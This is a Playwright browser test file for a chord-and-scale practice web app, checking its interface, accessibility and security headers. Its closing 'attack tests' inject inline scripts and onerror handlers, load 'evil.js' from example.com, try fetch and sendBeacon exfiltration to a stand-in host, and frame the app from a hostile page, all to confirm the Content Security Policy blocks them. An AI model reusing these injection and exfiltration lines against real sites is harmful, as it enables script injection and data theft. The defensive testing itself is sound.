// Browser tests: the app served under its real security headers.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { chromium } from 'playwright';
import { startServer } from './serve.mjs';

let server;
let browser;
before(async () => { server = await startServer(); browser = await chromium.launch(); });
after(async () => { await browser?.close(); await server?.close(); });

async function open(path = '/', { init } = {}) {
  const page = await browser.newPage();
  page.setDefaultTimeout(5000);
  const problems = [];
  page.on('console', (m) => { if (/Content Security Policy|Refused to/.test(m.text())) problems.push(m.text()); });
  page.on('pageerror', (e) => problems.push(String(e)));
  if (init) await page.addInitScript(init);
  await page.goto(server.url + path);
  await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0, null, { timeout: 5000 });
  return { page, problems };
}

async function enterChord(page, text) {
  await page.fill('#chord-text', text);
  await page.press('#chord-text', 'Enter');
}

test('the app loads cleanly under the CSP', async () => {
  const { page, problems } = await open();
  assert.deepEqual(problems, []);
  assert.equal(await page.isVisible('#view-practice'), true);
  await page.close();
});

test('typing Dm7 shows F Lydian', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  assert.match(await page.textContent('#tonic'), /F/);
  assert.equal((await page.textContent('#parent-notes')).trim(), 'F G A B C D E');
  await page.close();
});

test('a bad chord shows a message and keeps the last good one', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await enterChord(page, 'H7');
  assert.match(await page.textContent('#chord-error'), /“H”/);
  assert.match(await page.textContent('#tonic'), /F/);
  await page.close();
});

test('flat chords stay flat', async () => {
  const { page } = await open();
  await enterChord(page, 'Gb7');
  assert.match(await page.textContent('#tonic'), /F♭/);
  await page.close();
});

test('the app works when storage is blocked', async () => {
  const { page, problems } = await open('/', {
    init: () => { Object.defineProperty(window, 'localStorage', { get() { throw new Error('blocked'); } }); },
  });
  assert.deepEqual(problems, []);
  assert.equal(await page.inputValue('#chord-text'), 'Cmaj7');
  assert.match(await page.textContent('#tonic'), /^\s*C\s*$/);
  await page.close();
});

test('a corrupt saved chord falls back to Cmaj7', async () => {
  const { page } = await open('/', { init: () => { try { localStorage.setItem('lce.chord', '"zzz"'); } catch {} } });
  assert.equal(await page.inputValue('#chord-text'), 'Cmaj7');
  await page.close();
});

test('pressing Play twice then Stop leaves silence', async () => {
  const { page } = await open();
  await page.click('#play-scale');
  await page.click('#play-scale');
  await page.click('#stop');
  await page.waitForFunction(() => document.getElementById('live').textContent === 'Stopped');
  assert.equal(await page.getAttribute('#play-scale', 'aria-pressed'), 'false');
  await page.close();
});

test('the keyboard can be reached and walked with arrow keys', async () => {
  const { page } = await open();
  await page.focus('#chord-text');
  assert.equal(await page.evaluate(() => document.activeElement.id), 'chord-text');
  await page.locator('#keyboard [role="button"][tabindex="0"]').focus();
  const first = await page.evaluate(() => document.activeElement.getAttribute('aria-label'));
  await page.keyboard.press('ArrowRight');
  const second = await page.evaluate(() => document.activeElement.getAttribute('aria-label'));
  assert.notEqual(first, second);
  assert.match(second, /^[A-G]/);
  await page.close();
});

test('the gravity circle shows twelve tones in order from the tonic', async () => {
  const { page, problems } = await open('/#gravity');
  assert.equal(await page.isVisible('#view-gravity'), true);
  assert.equal(await page.locator('#gravity-circle .gnode').count(), 12);
  const first = await page.locator('#gravity-circle .gnode[data-rank="1"]').getAttribute('aria-label');
  assert.match(first, /^C\b/);
  assert.equal(await page.locator('#gravity-table tbody tr').count(), 12);
  assert.deepEqual(problems, []);
  await page.close();
});

test('arrow keys walk the gravity order and Enter explains a tone', async () => {
  const { page } = await open('/#gravity');
  await page.locator('#gravity-circle .gnode[tabindex="0"]').focus();
  await page.keyboard.press('ArrowRight');
  await page.keyboard.press('Enter');
  assert.match(await page.textContent('#gravity-note'), /rank 2 of 12/);
  await page.close();
});

test('the gravity tonic follows the Practice chord', async () => {
  const { page } = await open();
  await enterChord(page, 'Dm7');
  await page.click('#tab-gravity');
  const first = await page.locator('#gravity-circle .gnode[data-rank="1"]').getAttribute('aria-label');
  assert.match(first, /^F\b/);
  await page.close();
});

test('reference search filters the glossary as you type', async () => {
  const { page, problems } = await open('/#reference');
  const total = await page.locator('#glossary .gloss').count();
  assert.ok(total >= 15);
  await page.fill('#ref-search', 'gravity');
  const visible = page.locator('#glossary .gloss:visible');
  const count = await visible.count();
  assert.ok(count >= 1 && count < total);
  for (const text of await visible.allTextContents()) assert.match(text, /gravity/i);
  assert.match(await page.textContent('#ref-count'), /\d+/);
  await page.fill('#ref-search', '');
  assert.equal(await page.locator('#glossary .gloss:visible').count(), total);
  assert.deepEqual(problems, []);
  await page.close();
});

test('the chord table lists verified chords and the book citation is there', async () => {
  const { page } = await open('/#reference');
  assert.ok(await page.locator('#chord-table tbody tr').count() >= 12);
  assert.match(await page.textContent('#chord-table'), /Dm7|Cm7/);
  assert.match(await page.textContent('#sources-list'), /Concept Publishing, 2001/);
  assert.ok(await page.locator('#pending-list li').count() >= 1);
  await page.close();
});

test('every view reflows to a 320 px screen without sideways scrolling', async () => {
  const page = await browser.newPage({ viewport: { width: 320, height: 800 } });
  for (const hash of ['', '#gravity', '#reference']) {
    await page.goto(`${server.url}/${hash}`);
    await page.waitForFunction(() => document.getElementById('tonic')?.textContent.length > 0);
    assert.equal(await page.evaluate(() => document.documentElement.scrollWidth), 320, hash || '#practice');
  }
  await page.close();
});

test('scale cards have a short name and a description', async () => {
  const { page } = await open();
  const card = page.locator('.ladder-card').first();
  const name = await card.evaluate((el) => el.getAttribute('aria-labelledby').split(' ').map((id) => document.getElementById(id).textContent).join(' '));
  assert.match(name, /^1 C Lydian$/);
  const desc = await card.evaluate((el) => el.getAttribute('aria-describedby').split(' ').map((id) => document.getElementById(id).textContent).join(' '));
  assert.match(desc, /C D E F♯ G A B/);
  assert.equal(await page.locator('#tonic[aria-label]').count(), 0);
  await page.close();
});

// ---------- Attack tests: the policy must stop these ----------

test('injected inline scripts and handlers do not run', async () => {
  const { page, problems } = await open();
  await page.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__x = 1';
    document.body.append(s);
    const img = document.createElement('img');
    img.setAttribute('src', 'data:,x');
    img.setAttribute('onerror', 'window.__y = 1');
    document.body.append(img);
    const div = document.createElement('div');
    div.innerHTML = '<img src="nope.png" onerror="window.__z = 1">';
    document.body.append(div);
  });
  await page.waitForTimeout(300);
  assert.equal(await page.evaluate(() => window.__x), undefined);
  assert.equal(await page.evaluate(() => window.__y), undefined);
  assert.equal(await page.evaluate(() => window.__z), undefined);
  assert.ok(problems.some((p) => /Content Security Policy/.test(p)));
  await page.close();
});

test('scripts from other sites are refused', async () => {
  const { page } = await open();
  const loaded = await page.evaluate(() => new Promise((resolve) => {
    const s = document.createElement('script');
    s.src = 'https://example.com/evil.js';
    s.onload = () => resolve(true);
    s.onerror = () => resolve(false);
    document.head.append(s);
  }));
  assert.equal(loaded, false);
  await page.close();
});

test('the page cannot send data anywhere', async () => {
  const { page, problems } = await open();
  const outbound = [];
  page.on('request', (r) => { if (!r.url().startsWith(server.url)) outbound.push(r.url()); });
  const outcome = await page.evaluate(async () => {
    try { await fetch('https://example.com/steal?x=1'); return 'sent'; } catch { return 'blocked'; }
  });
  assert.equal(outcome, 'blocked');
  // sendBeacon reports true when it queues; what matters is that nothing leaves.
  await page.evaluate(() => { try { navigator.sendBeacon('https://example.com/b', 'x'); } catch {} });
  await page.waitForTimeout(400);
  assert.deepEqual(outbound.filter((u) => !u.startsWith('data:')), []);
  assert.ok(problems.some((p) => /connect-src/.test(p)));
  await page.close();
});

test('another site cannot frame the app', async () => {
  const { createServer } = await import('node:http');
  const evil = createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<!doctype html><iframe id="f" src="${server.url}/"></iframe>`);
  });
  await new Promise((r) => evil.listen(0, '127.0.0.1', r));
  const page = await browser.newPage();
  try {
    await page.goto(`http://localhost:${evil.address().port}/`);
    await page.waitForTimeout(800);
    const frame = page.frames().find((f) => f !== page.mainFrame());
    const inside = frame ? await frame.$('#tonic').catch(() => null) : null;
    assert.equal(inside, null);
  } finally {
    await page.close();
    await new Promise((r) => evil.close(r));
  }
});
